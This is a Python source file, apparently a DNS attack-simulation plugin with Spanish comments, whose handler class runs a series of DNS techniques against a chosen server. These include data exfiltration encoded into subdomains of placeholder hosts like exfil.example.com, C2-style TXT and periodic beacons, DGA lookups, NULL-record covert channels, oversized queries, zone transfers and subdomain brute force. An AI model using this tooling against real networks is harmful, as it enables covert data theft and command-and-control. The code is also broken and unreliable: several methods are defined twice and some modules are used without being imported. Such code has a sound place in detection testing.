from pathlib import Path
from plugins.outsider.models.baseHandler import BaseHandler
import dns.resolver
import dns.zone
import dns.query
import dns.message
import dns.rdatatype
import dns.rdataclass
import dns.name
import socket
import time
import random
import string
import base64
import hashlib
import json
from datetime import datetime
from typing import Dict, Any, List, Optional
import threading

class DnsHandler(BaseHandler):
    def init(self, model_dir: Path):
        super().init(model_dir)
        self.default_nameserver = '8.8.8.8'
        self.beacon_threads = {}
        self.active_beacons = {}

    def set_target(self, target: str):
        """
        Establece el servidor DNS objetivo.
        Acepta IP o hostname.
        """
        target = target.strip()

        # Validar IP
        try:
            ipaddress.ip_address(target)
            self.resolver.nameservers = [target]
            self.target = target
            return
        except ValueError:
            pass

        # Validar hostname
        hostname_regex = r"^(?!-)[A-Za-z0-9-]{1,63}(?<!-)(\.[A-Za-z]{2,})+$"
        if not re.match(hostname_regex, target):
            raise ValueError(f"Target DNS inválido: {target}")

        self.resolver.nameservers = [target]
        self.target = target

    def execute_payload(self, payload_id: str):
        try:
            payload_info = self.get_payload_info(payload_id)
            payload = payload_info.get("payload", {})

            qname = payload.get("qname")
            qtype = payload.get("qtype", "A")

            if not qname:
                raise ValueError("El payload DNS debe definir 'qname'")

            answers = self.resolver.resolve(qname, qtype)

            response_data = []
            for rdata in answers:
                response_data.append(str(rdata))

            return {
                "success": True,
                "query": {
                    "qname": qname,
                    "qtype": qtype
                },
                "response": response_data
            }

        except dns.exception.Timeout:
            return {
                "success": False,
                "response": "DNS query timeout"
            }
        except dns.resolver.NXDOMAIN:
            return {
                "success": False,
                "response": "NXDOMAIN"
            }
        except Exception as e:
            return {
                "success": False,
                "response": str(e)
            }
    def execute_payload(self, payload_id: str):
        try:
            payload_info = self.get_payload_info(payload_id)
            payload_config = payload_info.get("payload", {})
            action = payload_config.get("action", "query")
            
            if action == "exfiltration_subdomain":
                result = self._perform_exfiltration_subdomain(payload_config)
            elif action == "txt_beacon":
                result = self._perform_txt_beacon(payload_config)
            elif action == "periodic_txt_beacon":
                result = self._start_periodic_beacon(payload_config)
            elif action == "long_encoded_subdomain":
                result = self._perform_long_encoded_subdomain(payload_config)
            elif action == "dga_nxdomain":
                result = self._perform_dga_nxdomain(payload_config)
            elif action == "null_record_covert":
                result = self._perform_null_record_covert(payload_config)
            elif action == "too_long_query":
                result = self._perform_too_long_query(payload_config)
            elif action == "advanced_composite":
                result = self._perform_advanced_composite(payload_config)
            elif action == "axfr":
                result = self._perform_axfr(payload_config)
            elif action == "subdomain_brute":
                result = self._perform_subdomain_bruteforce(payload_config)
            elif action == "record_query":
                result = self._perform_record_query(payload_config)
            elif action == "stop_beacon":
                result = self._stop_beacon(payload_config)
            else:
                result = self._perform_generic_query(payload_config)
            
            return {
                "success": True,
                "response": result
            }

        except dns.resolver.NoNameservers:
            return {
                "success": False,
                "response": "Error: No se pudo alcanzar el servidor de nombres."
            }
        except dns.resolver.NXDOMAIN:
            return {
                "success": False,
                "response": "Error: El dominio consultado no existe."
            }
        except dns.exception.Timeout:
            return {
                "success": False,
                "response": "Error: Timeout al contactar el servidor DNS."
            }
        except Exception as e:
            return {
                "success": False,
                "response": f"Error inesperado en payload {payload_id}: {str(e)}"
            }

    def _perform_exfiltration_subdomain(self, config: Dict):
        data = config.get("data", "")
        domain = config.get("domain", "exfil.example.com")
        technique = config.get("technique", "base64")
        chunk_size = config.get("chunk_size", 30)
        delay_ms = config.get("delay_ms", 100)
        
        if not data:
            return "Error: No hay datos para exfiltrar en el payload"
        
        if technique == "base64":
            encoded = base64.b64encode(data.encode()).decode()
        elif technique == "hex":
            encoded = data.encode().hex()
        elif technique == "base32":
            encoded = base64.b32encode(data.encode()).decode()
        else:
            encoded = data
        
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        results = []
        
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [socket.gethostbyname(self.target)]
        
        for i, chunk in enumerate(chunks):
            subdomain = f"{chunk}.{i}.{domain}"
            try:
                answers = resolver.resolve(subdomain, "A")
                results.append(f"Chunk {i}: {chunk} -> OK")
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
                results.append(f"Chunk {i}: {chunk} -> NXDOMAIN")
            except Exception as e:
                results.append(f"Chunk {i}: {chunk} -> Error: {str(e)}")
            
            time.sleep(delay_ms / 1000)
        
        return f"Exfiltración completada. {len(chunks)} chunks enviados.\n" + "\n".join(results)

    def _perform_txt_beacon(self, config: Dict):
        beacon_type = config.get("beacon_type", "checkin")
        beacon_data = config.get("data", "")
        domain = config.get("domain", "c2.beacon.example.com")
        
        system_info = {
            "timestamp": datetime.now().isoformat(),
            "type": beacon_type,
            "data": beacon_data,
            "implant_id": hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        }
        
        if beacon_type == "initial_checkin":
            system_info["status"] = "active"
            system_info["first_seen"] = datetime.now().isoformat()
        
        txt_data = json.dumps(system_info)
        
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [socket.gethostbyname(self.target)]
        
        try:
            answers = resolver.resolve(domain, "TXT")
            response = "; ".join([str(r) for r in answers])
            return f"Beacon {beacon_type} enviado a {domain}. TXT Response: {response}"
        except Exception as e:
            return f"Beacon {beacon_type} enviado (sin respuesta). Error: {str(e)}"

    def _start_periodic_beacon(self, config: Dict):
        beacon_id = config.get("beacon_id", f"beacon_{int(time.time())}")
        interval = config.get("period_seconds", 300)
        domain = config.get("domain", "periodic.beacon.example.com")
        beacon_data_template = config.get("data_template", "Heartbeat at {timestamp}")
        
        if beacon_id in self.active_beacons:
            return f"Beacon {beacon_id} ya está activo."
        
        def beacon_worker():
            while beacon_id in self.active_beacons:
                try:
                    timestamp = datetime.now().isoformat()
                    data = beacon_data_template.replace("{timestamp}", timestamp)
                    
                    resolver = dns.resolver.Resolver()
                    resolver.nameservers = [socket.gethostbyname(self.target)]
                    
                    resolver.resolve(domain, "TXT")
                    
                except Exception:
                    pass
                
                for _ in range(interval * 10):
                    if beacon_id not in self.active_beacons:
                        break
                    time.sleep(0.1)
        
        self.active_beacons[beacon_id] = {
            "domain": domain,
            "interval": interval,
            "started": datetime.now().isoformat()
        }
        
        thread = threading.Thread(target=beacon_worker, daemon=True)
        thread.start()
        self.beacon_threads[beacon_id] = thread
        
        return f"Beacon periódico iniciado: ID={beacon_id}, Interval={interval}s, Domain={domain}"

    def _perform_long_encoded_subdomain(self, config: Dict):
        data = config.get("data", "")
        encoding = config.get("encoding", "base64")
        domain = config.get("domain", "long.example.com")
        max_length = config.get("max_length", 255)
        
        if encoding == "base64":
            encoded = base64.b64encode(data.encode()).decode()
        elif encoding == "base85":
            encoded = base64.b85encode(data.encode()).decode()
        elif encoding == "ascii85":
            encoded = base64.a85encode(data.encode()).decode()
        else:
            encoded = data
        
        if len(encoded) > max_length - len(domain) - 10:
            encoded = encoded[:max_length - len(domain) - 10]
        
        labels = []
        label_length = 60
        for i in range(0, len(encoded), label_length):
            chunk = encoded[i:i+label_length]
            labels.append(chunk)
        
        long_subdomain = ".".join(labels) + "." + domain
        
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [socket.gethostbyname(self.target)]
        
        try:
            answers = resolver.resolve(long_subdomain, "A", lifetime=5)
            return f"Consulta larga exitosa. Length: {len(long_subdomain)}\nResponse: {[str(r) for r in answers]}"
        except dns.exception.DNSException as e:
            return f"Consulta larga enviada. Length: {len(long_subdomain)}\nError: {str(e)}"

    def _perform_dga_nxdomain(self, config: Dict):
        algorithm = config.get("algorithm", "date_based")
        seed = config.get("seed", datetime.now().strftime("%Y%m%d"))
        count = config.get("domain_count", 50)
        tlds = config.get("tlds", [".com", ".net", ".org"])
        
        domains = []
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [socket.gethostbyname(self.target)]
        
        for i in range(count):
            if algorithm == "date_based":
                base = hashlib.md5(f"{seed}{i}".encode()).hexdigest()[:12]
                tld = random.choice(tlds)
                domain = f"{base}{tld}"
            elif algorithm == "cryptographic_seeded":
                h = hashlib.sha256(f"{seed}{i:08d}".encode()).hexdigest()
                parts = [h[j:j+6] for j in range(0, 24, 6)]
                tld = random.choice(tlds)
                domain = f"{'-'.join(parts)}{tld}"
            else:
                domain = f"dga-{i}-{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}.com"
            
            domains.append(domain)
            
            try:
                resolver.resolve(domain, "A", lifetime=2)
                domains[-1] = f"{domain} -> RESOLVED"
            except dns.resolver.NXDOMAIN:
                domains[-1] = f"{domain} -> NXDOMAIN"
            except Exception as e:
                domains[-1] = f"{domain} -> Error: {str(e)}"
            
            time.sleep(random.uniform(0.1, 0.5))
        
        return f"Generadas {count} consultas DGA con algoritmo '{algorithm}':\n" + "\n".join(domains)

    def _perform_null_record_covert(self, config: Dict):
        data = config.get("data", "")
        encoding = config.get("encoding", "binary_in_null")
        domain = config.get("domain", "covert.example.com")
        
        query = dns.message.make_query(domain, dns.rdatatype.NULL)
        
        if encoding == "binary_in_null":
            encoded_data = data.encode()
        
        try:
            response = dns.query.udp(query, self.target, timeout=5)
            return f"Canal NULL establecido a {domain}\nDatos: {data[:50]}...\nResponse RCODE: {dns.rcode.to_text(response.rcode())}"
        except Exception as e:
            return f"Error en canal NULL: {str(e)}"

    def _perform_too_long_query(self, config: Dict):
        query_length = config.get("query_length", 512)
        technique = config.get("technique", "max_label_length")
        base_domain = config.get("domain", "test.example.com")
        
        if technique == "max_label_length":
            long_label = "A" * 63
            num_labels = min(10, (query_length - len(base_domain)) // 64)
            domain = ".".join([long_label] * num_labels) + "." + base_domain
        elif technique == "overflow_total_length":
            overflow = "X" * 500
            domain = f"{overflow}.{base_domain}"
        else:
            domain = base_domain
        
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [socket.gethostbyname(self.target)]
        
        try:
            answers = resolver.resolve(domain, "A", lifetime=10)
            return f"Consulta larga exitosa. Length: {len(domain)}\nResponse: {[str(r) for r in answers]}"
        except dns.exception.SyntaxError:
            return f"Consulta rechazada por sintaxis inválida (length={len(domain)})"
        except dns.exception.Timeout:
            return f"Timeout - servidor posiblemente sobrecargado (length={len(domain)})"
        except Exception as e:
            return f"Error en consulta larga: {str(e)}"

    def _perform_advanced_composite(self, config: Dict):
        stages = config.get("stages", [])
        results = []
        
        for stage_config in stages:
            stage_num = stage_config.get("stage", 1)
            action = stage_config.get("action", "")
            purpose = stage_config.get("purpose", "")
            
            results.append(f"\n--- Stage {stage_num}: {action} ({purpose}) ---")
            
            time.sleep(1)
            
            if action == "dga_nxdomain":
                result = self._perform_dga_nxdomain(stage_config)
            elif action == "txt_beacon":
                result = self._perform_txt_beacon(stage_config)
            elif action == "exfiltration_subdomain":
                result = self._perform_exfiltration_subdomain(stage_config)
            elif action == "null_record_covert":
                result = self._perform_null_record_covert(stage_config)
            else:
                result = f"Acción no soportada en etapa compuesta: {action}"
            
            results.append(result)
        
        return "Ataque compuesto completado:\n" + "\n".join(results)

    def _perform_axfr(self, config: Dict):
        target_domain = config.get("domain", self.target)
        try:
            zone = dns.zone.from_xfr(dns.query.xfr(self.target, target_domain))
            records = []
            for name, node in zone.nodes.items():
                rdatasets = node.rdatasets
                for rdataset in rdatasets:
                    records.append(f"{name} {rdataset.ttl} IN {rdataset.rdtype} {rdataset}")
            return f"Transferencia de zona exitosa. Registros:\n" + "\n".join(records)
        except (dns.exception.FormError, ConnectionRefusedError, TimeoutError) as e:
            return f"Transferencia de zona fallida o no permitida: {str(e)}"

    def _perform_subdomain_bruteforce(self, config: Dict):
        subdomain_list = config.get("wordlist", ["www", "mail", "ftp", "admin"])
        domain = config.get("domain", self.target)
        
        found = []
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [socket.gethostbyname(self.target)]
        
        for sub in subdomain_list:
            try:
                full_name = f"{sub}.{domain}"
                answers = resolver.resolve(full_name, "A")
                found.append(f"{full_name} -> {[r.address for r in answers]}")
            except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
                continue
        
        return f"Subdominios encontrados ({len(found)}):\n" + "\n".join(found) if found else "No se encontraron subdominios."

    def _perform_record_query(self, config: Dict):
        record_type = config.get("record_type", "A")
        domain = config.get("domain", self.target)
        
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [socket.gethostbyname(self.target)]
        answers = resolver.resolve(domain, record_type)
        
        return f"Registros {record_type} para {domain}:\n" + "\n".join(str(r) for r in answers)

    def _perform_generic_query(self, config: Dict):
        return self._perform_record_query(config)

    def _stop_beacon(self, config: Dict):
        beacon_id = config.get("beacon_id")
        if not beacon_id:
            count = len(self.active_beacons)
            self.active_beacons.clear()
            for thread in self.beacon_threads.values():
                thread.join(timeout=1)
            self.beacon_threads.clear()
            return f"Todos los beacons detenidos ({count} total)"
        
        if beacon_id in self.active_beacons:
            del self.active_beacons[beacon_id]
            if beacon_id in self.beacon_threads:
                self.beacon_threads[beacon_id].join(timeout=1)
                del self.beacon_threads[beacon_id]
            return f"Beacon {beacon_id} detenido."
        else:
            return f"Beacon {beacon_id} no encontrado."

    def set_target(self, target: str):
        if not target or not target.strip():
            raise ValueError("El target no puede estar vacío.")
        
        try:
            socket.gethostbyname(target.strip())
        except socket.gaierror:
            raise ValueError(f"Target inválido: '{target}' no es una dirección válida.")
        
        self.target = target.strip()

    def cleanup(self):
        self._stop_beacon({})

    def get_status(self):
        return {
            "target": self.target,
            "active_beacons": list(self.active_beacons.keys()),
            "beacon_count": len(self.active_beacons),
            "default_nameserver": self.default_nameserver
        }